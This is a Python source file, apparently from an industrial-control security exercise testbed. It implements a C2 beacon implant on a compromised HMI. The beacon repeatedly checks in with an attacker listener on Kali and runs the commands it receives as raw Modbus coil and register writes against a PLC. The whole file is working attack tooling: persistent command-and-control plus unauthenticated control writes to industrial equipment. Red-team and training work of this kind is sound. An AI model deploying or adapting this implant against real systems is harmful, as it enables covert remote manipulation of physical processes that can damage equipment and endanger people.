#!/usr/bin/env python3
"""Beacon implant for the compromised-HMI cyber inject scenario.

See docs/cyber-vs-physical-fault-injection-design.md.

Represents an attacker's persistent access on this host, running
continuously from container start - the working assumption throughout
this project's cyber injects is that the compromise already happened
before the exercise begins, the same way Kali's ARP-spoofing foothold
(used by the read-path faults) is never itself simulated, just assumed.
This just periodically checks in with the C2 listener on Kali and asks
for instructions; nothing happens unless a command has been queued
there.

Uses nothing but Python's standard library - this host has no pymodbus
(it's a Java/Mango application, not Python-based), so raw sockets are
also a more faithful "living off the land" choice than dropping a new
dependency onto the host would be.
"""
import argparse
import json
import socket
import struct
import time


def write_coil(host, port, unit, address, value):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((host, port))
    coil_value = 0xFF00 if value else 0x0000
    pdu = struct.pack(">BHH", 5, address, coil_value)
    mbap = struct.pack(">HHHB", 1, 0, len(pdu) + 1, unit)
    s.sendall(mbap + pdu)
    resp = s.recv(256)
    s.close()
    return resp


def write_register(host, port, unit, address, value):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((host, port))
    pdu = struct.pack(">BHH", 6, address, value)
    mbap = struct.pack(">HHHB", 1, 0, len(pdu) + 1, unit)
    s.sendall(mbap + pdu)
    resp = s.recv(256)
    s.close()
    return resp


def execute(cmd, target_host, target_port, target_unit):
    action = cmd.get("action")
    address = cmd.get("address")
    value = cmd.get("value")
    if action == "write_coil":
        return write_coil(target_host, target_port, target_unit, address, value)
    if action == "write_register":
        return write_register(target_host, target_port, target_unit, address, value)
    print(f"[beacon] unknown action: {action}", flush=True)
    return None


def check_in(c2_host, c2_port, beacon_id):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((c2_host, c2_port))
        s.sendall((json.dumps({"beacon_id": beacon_id}) + "\n").encode())
        line = s.recv(4096)
        return json.loads(line.decode()) if line else {}
    except Exception as exc:
        print(f"[beacon] check-in failed: {exc}", flush=True)
        return {}
    finally:
        s.close()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--c2-host", required=True, help="Kali's IP")
    parser.add_argument("--c2-port", type=int, default=4444)
    parser.add_argument("--target-host", required=True, help="the real Modbus target, e.g. the PLC's IP")
    parser.add_argument("--target-port", type=int, default=502)
    parser.add_argument("--target-unit", type=int, default=1)
    parser.add_argument("--interval", type=float, default=5.0)
    parser.add_argument("--beacon-id", default="hmi-01")
    args = parser.parse_args()

    while True:
        response = check_in(args.c2_host, args.c2_port, args.beacon_id)
        cmd = response.get("cmd") if response else None
        if cmd:
            print(f"[beacon] received command: {cmd}", flush=True)
            result = execute(cmd, args.target_host, args.target_port, args.target_unit)
            print(f"[beacon] executed, response: {result.hex() if result else None}", flush=True)
        time.sleep(args.interval)


if __name__ == "__main__":
    main()
